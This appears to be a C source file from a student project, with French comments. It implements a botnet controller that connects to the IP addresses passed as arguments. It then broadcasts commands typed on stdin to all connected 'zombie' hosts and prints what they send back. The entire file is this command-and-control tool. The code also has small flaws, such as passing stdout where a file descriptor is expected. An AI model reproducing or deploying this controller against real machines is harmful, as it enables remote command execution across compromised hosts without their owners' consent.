#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <poll.h>

#include "utils_v2.h"
#include "network.h"

void sendCommandToZombies()
{
    char command[256];
    while (fgets(command, 256, stdin) != NULL)
    {
        for (size_t i = 0; i < nbrSockFD; i++)
        {
            swrite(sockFdPortsConnectedTab[i], command, strlen(command));
        }
    }

    disconnectZombies();
}

void listenToResponse()
{
    struct pollfd *fds = malloc(nbrSockFD * sizeof(struct pollfd));
    char buffer[2000];

    for (int i = 0; i < nbrSockFD; i++)
    {
        // init poll

        fds[i].fd = sockFdPortsConnectedTab[i];
        fds[i].events = POLLIN;
    }

    while (1)
    {
        spoll(fds, nbrSockFD, 10);

        for (int i = 0; i < nbrSockFD; i++)
        {
            if (fds[i].revents & POLLIN)
            {
                int nbChar = sread(fds[i].fd, buffer, 2000);

                swrite(stdout, buffer, nbChar);
            }
        }
    }
    free(fds);
}

int main(int argc, char const *argv[])
{
    if (argc < 2)
    {
        printf("Pas d'ip en argument\n");
        exit(1);
    }
    

    nbrSockFD = 0;
    for (size_t i = 1; i < argc; i++)
    {
        const char *ip = argv[i];
        testAndConnectPorts(ip);
    }

    printf("Entrez des commandes à envoyer des zombies et les réponses s'afficheront ici\n");

    pid_t pid;

    pid = sfork();
    if (pid == 0)
    {
        // FILS
        printf("je suis fils\n");
        sendCommandToZombies();
    }
    else
    {
        // PERE
        printf("je suis pere\n");
        listenToResponse();
    }
    // A METTRE DANS LE END HANDLER DU CTRL C
    free(sockFdPortsConnectedTab);
    return 0;
}
